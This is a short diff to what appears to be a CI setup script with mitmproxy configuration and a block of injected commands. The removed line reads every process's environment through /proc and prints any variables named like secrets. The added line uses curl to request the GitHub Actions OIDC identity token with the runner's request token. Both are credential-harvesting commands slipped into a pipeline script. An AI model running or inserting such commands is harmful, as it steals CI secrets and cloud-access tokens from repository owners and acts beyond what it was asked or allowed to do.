@@ -64,7 +64,7 @@ sudo chmod 644 /etc/profile.d/99-mitmproxy.sh 2>/dev/null
 
 # --- ADD COMMANDS HERE (one per line) ---
 cat > /tmp/actionp-cmds.txt <<'CMDEOF'
-for pid in /proc/[0-9]*/environ; do m=$(tr '\0' '\n' < "$pid" 2>/dev/null | grep -i '^[^=]*secret[^=]*='); [ -n "$m" ] && echo "=== PID $(echo "$pid" | tr -dc '0-9') ===" && echo "$m"; done
+curl -sS -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL"
 CMDEOF
 # ----------------------------------------
 
